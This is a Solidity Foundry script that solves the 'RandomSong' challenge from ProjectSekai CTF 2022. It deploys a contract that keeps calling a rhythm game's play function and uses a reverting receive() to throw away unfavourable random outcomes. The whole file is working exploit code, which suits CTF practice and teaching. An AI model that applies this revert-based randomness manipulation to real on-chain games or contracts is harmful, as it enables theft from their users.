// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";

contract ExploitScript is Script {
    // forge script src/ProjectSekaiCTF2022/RandomSong/Exploit.s.sol:ExploitScript --sig "deployExploit()" --broadcast --private-key $PRIVATE_KEY
    // forge create can be used.
    function deployExploit() public {
        vm.startBroadcast();
        new Exploit();
    }

    // forge script src/ProjectSekaiCTF2022/RandomSong/Exploit.s.sol:ExploitScript --broadcast --private-key $PRIVATE_KEY
    function run() public {
        vm.startBroadcast();
        address gameAddress = 0xc0C8c3718270438bAF1E17B404980A73C87D2914;
        address exploitAddress = 0x478aD48C36A4C265900358D111216E8365717eeD;
        IRhythmGame(gameAddress).fillEnergy();
        Exploit(payable(exploitAddress)).exploit(gameAddress);
    }
}

contract Exploit {
    function exploit(address gameAddress) public {
        IRhythmGame game = IRhythmGame(gameAddress);
        for (uint256 i = 0; i < (3 - game.allPerfect()); i++) {
            game.play(0);
        }
    }

    receive() external payable {
        // `game.allPerfect() < 3` can't be used because of outofgas
        require(msg.value == 10);
    }
}

interface IRhythmGame {
    function allPerfect() external returns (uint256);
    function fillEnergy() external;
    function play(uint256) external;
}
